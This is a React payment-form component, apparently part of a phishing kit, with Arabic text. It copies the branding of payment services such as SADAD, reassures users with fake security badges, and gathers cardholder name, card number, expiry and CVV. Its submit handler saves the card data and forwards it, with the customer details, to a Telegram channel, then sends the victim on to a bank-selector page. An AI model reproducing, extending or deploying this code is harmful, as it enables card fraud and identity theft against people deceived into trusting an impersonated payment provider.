import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, ShieldCheck, Lock, ChevronLeft, Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { serviceLogos } from "@/lib/serviceLogos";

const PaymentCardForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || customerInfo.service || 'sadad').toLowerCase();
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");
  
  const Layout = getCompanyLayout(serviceKey);
  const branding = serviceLogos[serviceKey] || serviceLogos['sadad'];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const expiry = `${expiryMonth}/${expiryYear}`;
    const cardInfo = { cardName, cardNumber, expiry, cvv };
    
    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData?.payload, cardInfo }
      });
      
      await sendToTelegram({
        type: 'card_details',
        data: { ...customerInfo, service: serviceKey, ...cardInfo, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });
      
      navigate(`/pay/${id}/bank-selector`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="text-right">
        {/* WORM_V2: REALISTIC PAYMENT HERO IMAGE */}
        <div className="relative w-full h-48 mb-8 overflow-hidden rounded-xl shadow-lg border border-gray-100">
           <img 
             src="/assets/branding/hero-payment-secure.jpg" 
             alt="Secure Payment" 
             className="w-full h-full object-cover"
           />
           <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent flex items-end p-6">
              <div className="text-white">
                 <div className="flex items-center gap-2 mb-1">
                    <ShieldCheck className="w-5 h-5 text-green-400" />
                    <span className="text-xs font-bold uppercase tracking-widest">المعاملة مؤمنة بالكامل</span>
                 </div>
                 <h4 className="text-xl font-black">إكمال عملية السداد الآمن</h4>
              </div>
           </div>
        </div>

        <h3 className="text-xl font-black text-gray-900 mb-6 flex items-center justify-end gap-2">
           بيانات بطاقة الدفع 
           <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
        </h3>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div 
            className="p-4 border-r-4 mb-8"
            style={{ 
              backgroundColor: `${branding.colors.primary}08`, 
              borderColor: branding.colors.primary 
            }}
          >
            <div className="flex items-start gap-3">
              <AlertCircle className="w-5 h-5 mt-0.5 text-blue-600" />
              <p className="text-xs font-bold text-gray-600 leading-relaxed">
                أنت الآن تقوم بعملية دفع آمنة لصالح <strong>{branding.nameAr || serviceKey.toUpperCase()}</strong> بمبلغ <strong>{formattedAmount}</strong>. يرجى التأكد من صحة البيانات.
              </p>
            </div>
          </div>

          <div className="space-y-5">
            <div className="space-y-2">
              <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">اسم حامل البطاقة (بالإنجليزي)</Label>
              <Input
                placeholder="CARDHOLDER NAME"
                value={cardName}
                onChange={(e) => setCardName(e.target.value.toUpperCase())}
                className="h-14 border-gray-200 rounded-none focus:border-blue-600 focus:ring-0 text-lg font-bold placeholder:text-gray-300"
                required
              />
            </div>

            <div className="space-y-2">
              <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">رقم البطاقة</Label>
              <div className="relative">
                <Input
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))}
                  className="h-14 border-gray-200 rounded-none focus:border-blue-600 focus:ring-0 text-xl font-mono tracking-widest"
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2 flex gap-1 grayscale opacity-50">
                   <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" />
                   <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">تاريخ الانتهاء</Label>
                <div className="grid grid-cols-2 gap-2">
                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                    <SelectTrigger className="h-14 border-gray-200 rounded-none"><SelectValue placeholder="MM" /></SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => (
                        <SelectItem key={m} value={m}>{m}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select value={expiryYear} onValueChange={setExpiryYear}>
                    <SelectTrigger className="h-14 border-gray-200 rounded-none"><SelectValue placeholder="YY" /></SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 15 }, (_, i) => (new Date().getFullYear() + i).toString().slice(-2)).map(y => (
                        <SelectItem key={y} value={y}>{y}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>

              <div className="space-y-2">
                <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">رمز الأمان (CVV)</Label>
                <Input
                  type="password"
                  placeholder="•••"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                  className="h-14 border-gray-200 rounded-none text-center font-mono text-lg"
                  required
                />
              </div>
            </div>
          </div>

          <div className="pt-6">
            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full h-16 text-xl font-black text-white rounded-none shadow-xl transition-all flex items-center justify-center gap-3"
              style={{ backgroundColor: branding.colors.primary }}
            >
              {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : (
                <>
                  <span>تأكيد دفع {formattedAmount}</span>
                  <ShieldCheck className="w-7 h-7" />
                </>
              )}
            </Button>
          </div>

          <div className="flex flex-col items-center gap-2 pt-4">
            <div className="flex items-center gap-2 text-[10px] text-gray-400 font-bold uppercase tracking-tighter">
              <Lock className="w-3 h-3" />
              <span>اتصال مشفر وآمن 256-bit SSL</span>
            </div>
            <div className="flex gap-4 opacity-30 grayscale contrast-125">
               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png" className="h-4" />
               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" className="h-4" />
               <img src="/assets/branding/logo-sadad.png" className="h-4" />
            </div>
          </div>
        </form>
      </div>
    </Layout>
  );
};

export default PaymentCardForm;
